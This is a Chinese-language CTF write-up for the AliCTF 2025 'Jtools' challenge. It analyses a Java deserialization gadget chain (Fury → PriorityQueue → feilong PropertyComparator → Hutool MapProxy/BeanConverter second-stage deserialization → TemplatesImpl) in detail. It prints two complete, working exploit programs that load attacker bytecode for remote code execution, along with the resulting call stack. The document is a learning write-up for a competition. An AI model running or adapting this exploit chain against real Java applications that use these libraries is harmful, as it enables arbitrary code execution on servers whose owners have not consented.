继续回溯找找ObjectUtil#deserialize调用点

找到一个动态代理类 cn.hutool.core.map.MapProxy#invoke 函数

### cn.hutool.core.map.MapProxy#invoke()

```java
public Object invoke(Object proxy, Method method, Object[] args) {  
    Class<?>[] parameterTypes = method.getParameterTypes();  
    if (ArrayUtil.isEmpty(parameterTypes)) {  
        Class<?> returnType = method.getReturnType();  
        if (Void.TYPE != returnType) {  
            String methodName = method.getName();  
            String fieldName = null;  
            if (methodName.startsWith("get")) {  
                fieldName = StrUtil.removePreAndLowerFirst(methodName, 3);  
            } else if (BooleanUtil.isBoolean(returnType) && methodName.startsWith("is")) {  
                fieldName = StrUtil.removePreAndLowerFirst(methodName, 2);  
            } else {  
                if ("hashCode".equals(methodName)) {  
                    return this.hashCode();  
                }  
  
                if ("toString".equals(methodName)) {  
                    return this.toString();  
                }  
            }  
  
            if (StrUtil.isNotBlank(fieldName)) {  
                if (!this.containsKey(fieldName)) {  
                    fieldName = StrUtil.toUnderlineCase(fieldName);  
                }  
  
                return Convert.convert(method.getGenericReturnType(), this.get(fieldName));  
            }  
        }  
    } else if (1 == parameterTypes.length) {  
        String methodName = method.getName();  
        if (methodName.startsWith("set")) {  
            String fieldName = StrUtil.removePreAndLowerFirst(methodName, 3);  
            if (StrUtil.isNotBlank(fieldName)) {  
                this.put(fieldName, args[0]);  
                Class<?> returnType = method.getReturnType();  
                if (returnType.isInstance(proxy)) {  
                    return proxy;  
                }  
            }  
        } else if ("equals".equals(methodName)) {  
            return this.equals(args[0]);  
        }  
    }  
  
    throw new UnsupportedOperationException(method.toGenericString());  
}
```

当调用到代理对象的getter，is开头的方法时，会触发`return Convert.convert(method.getGenericReturnType(), this.get(fieldName));`的调用，注意代理函数名称不能为 hashCode 、 toString 等
![](image/Pasted%20image%2020260514004132.png)

随后一路跟进会来到cn.hutool.core.convert.impl.BeanConverter#convertInternal

### BeanConverter#convertInternal（）

```java
protected T convertInternal(Object value) {  
    Class<?>[] interfaces = this.beanClass.getInterfaces();  
  
    for(Class<?> anInterface : interfaces) {  
        if ("cn.hutool.json.JSONBeanParser".equals(anInterface.getName())) {  
            T obj = (T)ReflectUtil.newInstanceIfPossible(this.beanClass);  
            ReflectUtil.invoke(obj, "parse", new Object[]{value});  
            return obj;  
        }  
    }  
  
    if (!(value instanceof Map) && !(value instanceof ValueProvider) && !BeanUtil.isBean(value.getClass())) {  
        if (value instanceof byte[]) {  
            return (T)ObjectUtil.deserialize((byte[])value, new Class[0]);  
        } else if (StrUtil.isEmptyIfStr(value)) {  
            return null;  
        } else {  
            throw new ConvertException("Unsupported source type: {}", new Object[]{value.getClass()});  
        }  
    } else if (value instanceof Map && this.beanClass.isInterface()) {  
        return (T)MapProxy.create((Map)value).toProxyBean(this.beanClass);  
    } else {  
        return (T)BeanCopier.create(value, ReflectUtil.newInstanceIfPossible(this.beanClass), this.beanType, this.copyOptions).copy();  
    }  
}
```

里面会触发ObjectUtil.deserialize的调用，并且回溯后会发现convertInternal函数中的value其实就是invoke中的this.get(fieldName)，也就是字段的值

那么二次反序列化的链子就是

### 二次反序列化的链子

```java
cn.hutool.core.map.MapProxy#invoke()->
	BeanConverter#convertInternal(Object value)->if (value instanceof byte[])->
		ObjectUtil.deserialize((byte[])value, new Class[0])->
			cn.hutool.core.io.IoUtil#readObj()
```

然后我们需要用什么类作为代理类呢？官方用的是Dialect类

## 代理类为什么用Dialect类

看到cn.hutool.core.map.MapProxy#invoke()中到达Convert.convert()调用之前的代码

```java
public Object invoke(Object proxy, Method method, Object[] args) {  
    Class<?>[] parameterTypes = method.getParameterTypes();  
    if (ArrayUtil.isEmpty(parameterTypes)) {  
        Class<?> returnType = method.getReturnType();  
        if (Void.TYPE != returnType) {  
            String methodName = method.getName();  
            String fieldName = null;  
            if (methodName.startsWith("get")) {  
                fieldName = StrUtil.removePreAndLowerFirst(methodName, 3);  
            } else if (BooleanUtil.isBoolean(returnType) && methodName.startsWith("is")) {  
                fieldName = StrUtil.removePreAndLowerFirst(methodName, 2);  
            } else {  
                if ("hashCode".equals(methodName)) {  
                    return this.hashCode();  
                }  
  
                if ("toString".equals(methodName)) {  
                    return this.toString();  
                }  
            }  
  
            if (StrUtil.isNotBlank(fieldName)) {  
                if (!this.containsKey(fieldName)) {  
                    fieldName = StrUtil.toUnderlineCase(fieldName);  
                }  
  
                return Convert.convert(method.getGenericReturnType(), this.get(fieldName));  
            }  
        }  
    }
```

要走到 Convert.convert()，必须同时满足这些条件：

- 方法**没有参数**
- 方法返回值**不是 void**
- 方法名是 getXxx()，或者是布尔返回值的 isXxx()
- 解析出来的 fieldName 不能为空
- 前面的特殊方法不是 hashCode() / toString()

然后再看cn.hutool.core.convert.ConverterRegistry#convert()中如何触发BeanConverter#convert()

```java
public <T> T convert(Type type, Object value, T defaultValue, boolean isCustomFirst) throws ConvertException {  
    if (TypeUtil.isUnknown(type) && null == defaultValue) {  
        return (T)value;  
    } else if (ObjectUtil.isNull(value)) {  
        return defaultValue;  
    } else {  
        if (TypeUtil.isUnknown(type)) {  
            type = defaultValue.getClass();  
        }  
  
        if (value instanceof Opt) {  
            value = ((Opt)value).get();  
            if (ObjUtil.isNull(value)) {  
                return defaultValue;  
            }  
        }  
  
        if (value instanceof Optional) {  
            value = ((Optional)value).orElse((Object)null);  
            if (ObjUtil.isNull(value)) {  
                return defaultValue;  
            }  
        }  
  
        if (type instanceof TypeReference) {  
            type = ((TypeReference)type).getType();  
        }  
  
        if (value instanceof TypeConverter) {  
            return (T)ObjUtil.defaultIfNull(((TypeConverter)value).convert(type, value), defaultValue);  
        } else {  
            Converter<T> converter = this.<T>getConverter(type, isCustomFirst);  
            if (null != converter) {  
                return (T)converter.convert(value, defaultValue);  
            } else {  
                Class<T> rowType = TypeUtil.getClass(type);  
                if (null == rowType) {  
                    if (null == defaultValue) {  
                        return (T)value;  
                    }  
  
                    rowType = defaultValue.getClass();  
                }  
  
                T result = (T)this.convertSpecial(type, rowType, value, defaultValue);  
                if (null != result) {  
                    return result;  
                } else if (BeanUtil.isBean(rowType)) {  
                    return (T)(new BeanConverter(type)).convert(value, defaultValue);  
                } else {  
                    throw new ConvertException("Can not Converter from [{}] to [{}]", new Object[]{value.getClass().getName(), type.getTypeName()});  
                }  
            }  
        }  
    }  
}
```

最后一层要求这个类需要是一个**JavaBean**

综上所述就可以找到Dialect类

![](image/Pasted%20image%2020260514021215.png)
# 最终的链子

```java
PriorityQueue#readObject()->
PriorityQueue#heapify()->
PriorityQueue#siftDown()->
PriorityQueue#siftDownUsingComparator()->
	com.feilong.core.util.comparator.PropertyComparator#compare()->
		动态代理类Dialect#getWrapper()->触发二次反序列化链子
			cn.hutool.core.map.MapProxy#invoke()->
				BeanConverter#convertInternal(Object value)->
					ObjectUtil.deserialize((byte[])value, new Class[0])->
						cn.hutool.core.io.IoUtil#readObj()->
							CC4链打任意类加载的链子序列化后的字节码
```

# 官方EXP

```java
package com.exp;

import cn.hutool.core.map.MapProxy;
import cn.hutool.core.util.ReflectUtil;
import cn.hutool.core.util.SerializeUtil;
import com.feilong.core.util.comparator.PropertyComparator;
import com.feilong.lib.digester3.ObjectCreationFactory;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;


public class Main {

    static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(fieldName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }


    public static void main(String[] args) throws Exception {
        ///templates

        InputStream inputStream = Main.class.getResourceAsStream("Evil.class");
        byte[]   bytes       = new byte[inputStream.available()];
        inputStream.read(bytes);

        TemplatesImpl tmpl      = new TemplatesImpl();
        Field    bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{bytes});
        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmpl, "hello");


        TemplatesImpl tmpl1      = new TemplatesImpl();
        Field    bytecodes1 = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes1.setAccessible(true);
        bytecodes1.set(tmpl1, new byte[][]{bytes});
        Field name1 = TemplatesImpl.class.getDeclaredField("_name");
        name1.setAccessible(true);
        name1.set(tmpl1, "hello2");
        ///templates
        String prop = "digester";
        PropertyComparator propertyComparator = new PropertyComparator(prop);
        Fury fury = Fury.builder().withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .build();
        ////jdk

        Object templatesImpl1 = tmpl1;
        Object templatesImpl = tmpl;

        PropertyComparator propertyComparator1 = new PropertyComparator("outputProperties");

        PriorityQueue priorityQueue1 = new PriorityQueue(2, propertyComparator1);
        ReflectUtil.setFieldValue(priorityQueue1, "size", "2");
        Object[] objectsjdk = {templatesImpl1, templatesImpl};
        setFieldValue(priorityQueue1, "queue", objectsjdk);
        /////jdk

        byte[] data = SerializeUtil.serialize(priorityQueue1);

        Map hashmap = new HashMap();
        hashmap.put(prop, data);

        MapProxy mapProxy = new MapProxy(hashmap);
        ObjectCreationFactory  test = (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), new Class[]{ObjectCreationFactory.class}, mapProxy);
        ObjectCreationFactory  test1 = (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), new Class[]{ObjectCreationFactory.class}, mapProxy);


        PriorityQueue priorityQueue = new PriorityQueue(2, propertyComparator);
        ReflectUtil.setFieldValue(priorityQueue, "size", "2");
        Object[] objects = {test, test1};
        setFieldValue(priorityQueue, "queue", objects);

        byte[] serialize = fury.serialize(priorityQueue);
        System.out.println(Base64.getEncoder().encodeToString(serialize));

    }
}
```

链子明天再写吧，鏖战到一点半了太困了

# 手写EXP

```java
package com.ctf.AliCTF2025_Jtools;  
  
import cn.hutool.core.map.MapProxy;  
import cn.hutool.core.util.ObjectUtil;  
import cn.hutool.db.dialect.Dialect;  
import com.feilong.core.util.comparator.PropertyComparator;  
import com.feilong.lib.javassist.ClassPool;  
import com.feilong.lib.javassist.CtClass;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.fury.Fury;  
import org.apache.fury.config.Language;  
  
import javax.xml.transform.Templates;  
import java.lang.reflect.Field;  
import java.lang.reflect.Proxy;  
import java.util.Base64;  
import java.util.HashMap;  
import java.util.Map;  
import java.util.PriorityQueue;  
  
public class POC {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates1 = (TemplatesImpl) get_template("com.ctf.AliCTF2025_Jtools.EXP");  
        TemplatesImpl templates2 = (TemplatesImpl) get_template("com.ctf.AliCTF2025_Jtools.EXP");  
  
        PropertyComparator propertyComparator1 = new PropertyComparator("outputProperties");  
        PriorityQueue priorityQueue1 = new PriorityQueue(propertyComparator1);  
  
        setFieldValue(priorityQueue1,"size",2);  
        setFieldValue(priorityQueue1,"queue",new Object[]{templates1, templates2});  
  
        byte[] poc1 = ObjectUtil.serialize(priorityQueue1);  
  
        //触发二次反序列化  
        Map hashMap = new HashMap();  
        hashMap.put("wrapper",poc1);  
        MapProxy mapProxy = new MapProxy(hashMap);  
  
        Dialect o1 = (Dialect) Proxy.newProxyInstance(Dialect.class.getClassLoader(), new Class[]{Dialect.class}, mapProxy);  
        Dialect o2 = (Dialect) Proxy.newProxyInstance(Dialect.class.getClassLoader(), new Class[]{Dialect.class}, mapProxy);  
  
        PropertyComparator propertyComparator2 = new PropertyComparator("wrapper");  
        PriorityQueue priorityQueue2 = new PriorityQueue(propertyComparator2);  
  
        setFieldValue(priorityQueue2,"size",2);  
        setFieldValue(priorityQueue2, "queue", new Object[]{o1,o2});  
  
        String poc = furyserialize(priorityQueue2);  
        furyunserialize(poc);  
    }  
  
  
    private static Object get_template(String className) throws Exception {  
        ClassPool pool = ClassPool.getDefault();  
        CtClass cc = pool.get(className);  
        byte[] bytecode = cc.toBytecode();  
  
        Templates templates = new TemplatesImpl();  
        setFieldValue(templates, "_bytecodes", new byte[][]{bytecode});  
        setFieldValue(templates, "_name", "pwnr");  
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());  
  
        return templates;  
    }  
    //反射设置字段值  
    public static void setFieldValue(Object object, String field_name, Object field_value) throws NoSuchFieldException, IllegalAccessException{  
        Field field = object.getClass().getDeclaredField(field_name);  
        field.setAccessible(true);  
        field.set(object, field_value);  
    }  
    public static String furyserialize(Object data) {  
        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();  
        byte[] serialize = fury.serialize(data);  
        return Base64.getEncoder().encodeToString(serialize);  
    }  
    public static void furyunserialize(String data) {  
        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();  
        fury.deserialize(Base64.getDecoder().decode(data));  
    }  
}
```

![](image/Pasted%20image%2020260516004903.png)

调用栈如下：

```java
<init>:11, EXP (com.ctf.AliCTF2025_Jtools)
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
newInstance:422, Constructor (java.lang.reflect)
newInstance:442, Class (java.lang)
getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invokeMethod:1922, PropertyUtilsBean (com.feilong.lib.beanutils)
getSimpleProperty:1095, PropertyUtilsBean (com.feilong.lib.beanutils)
getSimpleProperty:1079, PropertyUtilsBean (com.feilong.lib.beanutils)
getProperty:825, PropertyUtilsBean (com.feilong.lib.beanutils)
getProperty:162, PropertyUtils (com.feilong.lib.beanutils)
getDataUseApache:89, PropertyValueObtainer (com.feilong.core.bean)
obtain:70, PropertyValueObtainer (com.feilong.core.bean)
getProperty:577, PropertyUtil (com.feilong.core.bean)
compare:430, PropertyComparator (com.feilong.core.util.comparator)
siftDownUsingComparator:721, PriorityQueue (java.util)
siftDown:687, PriorityQueue (java.util)
heapify:736, PriorityQueue (java.util)
readObject:795, PriorityQueue (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invokeReadObject:1058, ObjectStreamClass (java.io)
readSerialData:1900, ObjectInputStream (java.io)
readOrdinaryObject:1801, ObjectInputStream (java.io)
readObject0:1351, ObjectInputStream (java.io)
readObject:371, ObjectInputStream (java.io)
readObj:615, IoUtil (cn.hutool.core.io)
readObj:582, IoUtil (cn.hutool.core.io)
readObj:563, IoUtil (cn.hutool.core.io)
deserialize:70, SerializeUtil (cn.hutool.core.util)
deserialize:594, ObjectUtil (cn.hutool.core.util)
convertInternal:92, BeanConverter (cn.hutool.core.convert.impl)
convert:58, AbstractConverter (cn.hutool.core.convert)
convert:243, ConverterRegistry (cn.hutool.core.convert)
convert:262, ConverterRegistry (cn.hutool.core.convert)
convertWithCheck:753, Convert (cn.hutool.core.convert)
convert:706, Convert (cn.hutool.core.convert)
convert:677, Convert (cn.hutool.core.convert)
invoke:147, MapProxy (cn.hutool.core.map)
getWrapper:-1, $Proxy0 (com.sun.proxy)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invokeMethod:1922, PropertyUtilsBean (com.feilong.lib.beanutils)
getSimpleProperty:1095, PropertyUtilsBean (com.feilong.lib.beanutils)
getSimpleProperty:1079, PropertyUtilsBean (com.feilong.lib.beanutils)
getProperty:825, PropertyUtilsBean (com.feilong.lib.beanutils)
getProperty:162, PropertyUtils (com.feilong.lib.beanutils)
getDataUseApache:89, PropertyValueObtainer (com.feilong.core.bean)
obtain:70, PropertyValueObtainer (com.feilong.core.bean)
getProperty:577, PropertyUtil (com.feilong.core.bean)
compare:430, PropertyComparator (com.feilong.core.util.comparator)
siftUpUsingComparator:669, PriorityQueue (java.util)
siftUp:645, PriorityQueue (java.util)
offer:344, PriorityQueue (java.util)
add:321, PriorityQueue (java.util)
readSameTypeElements:694, AbstractCollectionSerializer (org.apache.fury.serializer.collection)
generalJavaRead:672, AbstractCollectionSerializer (org.apache.fury.serializer.collection)
readElements:595, AbstractCollectionSerializer (org.apache.fury.serializer.collection)
read:73, CollectionSerializer (org.apache.fury.serializer.collection)
read:28, CollectionSerializer (org.apache.fury.serializer.collection)
readDataInternal:959, Fury (org.apache.fury)
readRef:861, Fury (org.apache.fury)
deserialize:793, Fury (org.apache.fury)
deserialize:714, Fury (org.apache.fury)
furyunserialize:79, POC (com.ctf.AliCTF2025_Jtools)
main:50, POC (com.ctf.AliCTF2025_Jtools)
```

题目是不出网的，这里由于没spring啥的依赖所以打内存马有点困难，但是题目贴心的给了一个读取`/tmp/desc.txt`的文件，那么直接覆盖读文件就可以了
# 写EXP需要注意的问题

## 1.为什么需要两个templates

看到PriorityQueue类触发compare的方法

```java
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {  
    // Read in size, and any hidden stuff  
    s.defaultReadObject();  
  
    // Read in (and discard) array length  
    s.readInt();  
  
    queue = new Object[size];  
  
    // Read in all elements.  
    for (int i = 0; i < size; i++)  
        queue[i] = s.readObject();  
  
    // Elements are guaranteed to be in "proper order", but the  
    // spec has never explained what that might be.    heapify();  
}
private void heapify() {  
    for (int i = (size >>> 1) - 1; i >= 0; i--)  //size为2，计算后i=0
        siftDown(i, (E) queue[i]);  //queue[0]=templates1
}
private void siftDown(int k, E x) {  
    if (comparator != null)  
        siftDownUsingComparator(k, x);  //进入这里
    else  
        siftDownComparable(k, x);  
}
private void siftDownUsingComparator(int k, E x) {  
    int half = size >>> 1;  //half=1
    while (k < half) {  //true,进入循环
        int child = (k << 1) + 1;  //child=1
        Object c = queue[child];  //c = queue[1] = templates2
        int right = child + 1;  //right = 2
        if (right < size &&  //false
            comparator.compare((E) c, (E) queue[right]) > 0)  
            c = queue[child = right];  
        if (comparator.compare(x, (E) c) <= 0)  //关键点：comparator.compare(templates1, templates2)
            break;  
        queue[k] = c;  
        k = child;  
    }  
    queue[k] = x;  
}
```

## 2.MapProxy为什么需要插入一个hashmap

看到MapProxy#invoke方法中的convert的调用

![](image/Pasted%20image%2020260516004305.png)

前面也提到了最后反序列化的value就是这个值，但是这个值是什么呢？跟进get方法就可以看到：

```java
public Object get(Object key) {  
    return this.map.get(key);  
}
```

是map中键对应的值，所以一切都说得通了

参考文章：

https://aecous.github.io/2025/06/29/%E9%98%BF%E9%87%8C%E4%BA%91jtools/

https://asal1n.github.io/2025/03/02/JAVA%20Fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html

https://baozongwi.xyz/p/alictf-2025-jtools/

https://xz.aliyun.com/news/17029

https://www.ctfiot.com/229693.html